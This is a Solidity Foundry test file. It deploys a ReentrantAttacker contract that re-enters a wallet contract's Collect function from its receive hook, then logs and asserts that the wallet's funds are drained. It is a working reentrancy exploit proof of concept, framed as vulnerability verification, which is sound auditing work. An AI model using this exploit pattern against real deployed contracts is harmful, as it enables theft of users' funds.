// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol";

contract MockLog {
    function AddMessage(address, uint, string memory) public {}
}

contract ReentrantAttacker {
    WALLET public wallet;
    uint256 public unlockTime;
    uint public reentrancyCount;

    constructor(address walletAddress) {
        wallet = WALLET(payable(walletAddress));
        unlockTime = block.timestamp + 1 days;
    }

    function attack(uint256 _amount) public {
        wallet.Collect(_amount);
    }

    function deposit() public payable {
        wallet.Put{value: msg.value}(unlockTime);
    }

    receive() external payable {
        if (reentrancyCount < 1) {
            reentrancyCount++;
            wallet.Collect(msg.value);
        }
    }
}

contract CollectReentrancyTest is Test {
    WALLET wallet;
    MockLog mockLog;
    ReentrantAttacker attacker;

    function setUp() public {
        mockLog = new MockLog();
        wallet = new WALLET(address(mockLog));
        attacker = new ReentrantAttacker(address(wallet));
        vm.deal(address(attacker), 2 ether);
    }

    function testReentrancyVulnerability() public {
        // Deposit funds to vulnerable contract
        vm.prank(address(attacker));
        attacker.deposit{value: 1 ether}();

        // Fast-forward to unlock time
        vm.warp(attacker.unlockTime() + 1);

        // Pre-attack state snapshot
        console.log("--- PRE-ATTACK STATE ---");
        uint walletBalanceBefore = address(wallet).balance;
        uint attackerBalanceBefore = address(attacker).balance;
        (uint accBalanceBefore, ) = wallet.Acc(address(attacker));
        uint reentrancyCountBefore = attacker.reentrancyCount();
        
        console.log("Wallet Balance:", walletBalanceBefore);
        console.log("Attacker Contract Balance:", attackerBalanceBefore);
        console.log("Attacker Account Balance (in Wallet):", accBalanceBefore);
        console.log("Reentrancy Count:", reentrancyCountBefore);

        console.log("--- TRIGGER ATTACK ---");
        // Execute reentrancy attack
        attacker.attack(0.5 ether);

        // Post-attack state snapshot
        console.log("--- POST-ATTACK STATE ---");
        uint walletBalanceAfter = address(wallet).balance;
        uint attackerBalanceAfter = address(attacker).balance;
        (uint accBalanceAfter, ) = wallet.Acc(address(attacker));
        uint reentrancyCountAfter = attacker.reentrancyCount();

        console.log("Wallet Balance:", walletBalanceAfter);
        console.log("Attacker Contract Balance:", attackerBalanceAfter);
        console.log("Attacker Account Balance (in Wallet):", accBalanceAfter);
        console.log("Reentrancy Count:", reentrancyCountAfter);

        // Vulnerability verification
        bool walletDrained = walletBalanceAfter == 0;
        bool attackerEnriched = attackerBalanceAfter == 2 ether;
        bool accountBalancesZeroed = accBalanceAfter == 0;
        bool reentrancyDetected = reentrancyCountAfter == 1;
        
        console.log("Wallet drained:", walletDrained);
        console.log("Attacker enriched (2 ETH):", attackerEnriched);
        console.log("Account balance zeroed:", accountBalancesZeroed);
        console.log("Reentrancy detected:", reentrancyDetected);

        // Final verdict
        if (walletDrained && attackerEnriched && accountBalancesZeroed && reentrancyDetected) {
            console.log("Vulnerability Exists: reentrancy allows draining contract funds");
        } else {
            console.log("Vulnerability not Exist: state changes incompatible with successful exploit");
        }

        // Original verification assertions
        assertEq(address(wallet).balance, 0, "Contract funds not drained");
        assertEq(address(attacker).balance, 2 ether, "Incorrect attacker balance");
        assertEq(attacker.reentrancyCount(), 1, "Reentrancy not detected");
    }
}